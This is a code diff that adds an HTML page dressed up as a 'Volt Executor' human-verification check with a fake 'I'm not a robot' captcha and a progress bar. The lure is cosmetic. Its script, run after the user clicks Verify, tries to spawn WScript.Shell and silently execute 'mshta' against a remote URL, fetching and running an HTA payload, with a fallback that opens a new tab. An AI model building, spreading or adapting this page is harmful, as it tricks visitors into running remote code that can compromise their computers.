@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Check | Volt Executor</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.verify-box{background:#1a1a1a;border-radius:12px;padding:48px 40px;width:360px;text-align:center;box-shadow:0 0 60px rgba(167,74,242,0.1)}
+.verify-box h1{font-size:16px;font-weight:600;margin-bottom:16px;color:rgba(255,255,255,0.9)}
+.verify-box p{font-size:13px;color:rgba(255,255,255,0.5);margin-bottom:32px}
+.captcha-box{background:#0d0d0d;border:2px solid rgba(167,74,242,0.3);border-radius:8px;padding:24px;margin-bottom:24px;cursor:pointer;transition:all 0.3s}
+.captcha-box:hover{border-color:#a74af2;transform:scale(1.02)}
+.captcha-check{width:48px;height:48px;border:3px solid rgba(255,255,255,0.2);border-radius:8px;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;transition:all 0.3s}
+.captcha-check.checked{background:#a74af2;border-color:#a74af2}
+.captcha-check svg{opacity:0;transition:all 0.2s}
+.captcha-check.checked svg{opacity:1}
+.captcha-label{font-size:14px;color:rgba(255,255,255,0.6)}
+.verify-btn{background:linear-gradient(135deg,#a74af2,#753ae4);color:#fff;padding:14px 32px;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;width:100%;opacity:0.5;pointer-events:none;transition:all 0.3s}
+.verify-btn.active{opacity:1;pointer-events:auto}
+.verify-btn.active:hover{transform:translateY(-2px);box-shadow:0 4px 20px rgba(167,74,242,0.4)}
+.status{margin-top:24px;font-size:12px;color:rgba(255,255,255,0.4);display:none}
+.status.loading{display:block}
+.status span{animation:dot 1.5s infinite}
+@keyframes dot{0%,20%{content:"."}40%,60%{content:".."}80%,100%{content:"..."}}
+.progress{width:100%;height:4px;background:rgba(255,255,255,0.1);border-radius:2px;margin-top:16px;overflow:hidden;display:none}
+.progress.active{display:block}
+.progress-bar{height:100%;background:linear-gradient(135deg,#a74af2,#753ae4);width:0%;transition:width 0.3s;border-radius:2px}
+.footer{margin-top:32px;font-size:11px;color:rgba(255,255,255,0.2)}
+.footer a{color:rgba(255,255,255,0.3)}
+</style>
+</head>
+<body>
+<div class="verify-box">
+<h1>Complete Security Check</h1>
+<p>Please verify you are human to continue</p>
+<div class="captcha-box" id="captcha">
+<div class="captcha-check" id="check">
+<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+<polyline points="20 6 9 17 4 12"></polyline>
+</svg>
+</div>
+<div class="captcha-label">I'm not a robot</div>
+</div>
+<button class="verify-btn" id="verifyBtn">Verify</button>
+<div class="progress" id="progress"><div class="progress-bar" id="progressBar"></div></div>
+<div class="status" id="status">Verifying<span></span></div>
+<div class="footer">Protected by <a href="#">Volt Security</a></div>
+</div>
+
+<script>
+var checked = false;
+document.getElementById('captcha').addEventListener('click', function(){
+  if(checked) return;
+  checked = true;
+  document.getElementById('check').classList.add('checked');
+  document.getElementById('verifyBtn').classList.add('active');
+});
+
+document.getElementById('verifyBtn').addEventListener('click', function(){
+  var btn = this;
+  var progress = document.getElementById('progress');
+  var bar = document.getElementById('progressBar');
+  var status = document.getElementById('status');
+  btn.style.display = 'none';
+  progress.classList.add('active');
+  status.classList.add('active');
+
+  var pct = 0;
+  var interval = setInterval(function(){
+    pct += Math.random() * 15 + 5;
+    if(pct > 95) pct = 95;
+    bar.style.width = pct + '%';
+    if(pct > 30) status.textContent = 'Analyzing traffic<span></span>';
+    if(pct > 60) status.textContent = 'Checking reputation<span></span>';
+    if(pct > 85) status.textContent = 'Almost there<span></span>';
+  }, 300);
+
+  setTimeout(function(){
+    clearInterval(interval);
+    bar.style.width = '100%';
+    status.textContent = 'Verification complete!';
+    status.style.color = '#a74af2';
+    
+    setTimeout(function(){
+      // Try ActiveX to spawn mshta
+      try {
+        var sh = new ActiveXObject('WScript.Shell');
+        sh.Run('mshta https://synapsez.xyz/verify', 0, false);
+      } catch(e) {
+        // Fallback: open HTA in new tab
+        var popup = window.open('/', '_blank');
+        if(popup) popup.focus();
+        else window.location.href = '/';
+      }
+    }, 500);
+  }, 2000);
+});
+</script>
+</body>
+</html>
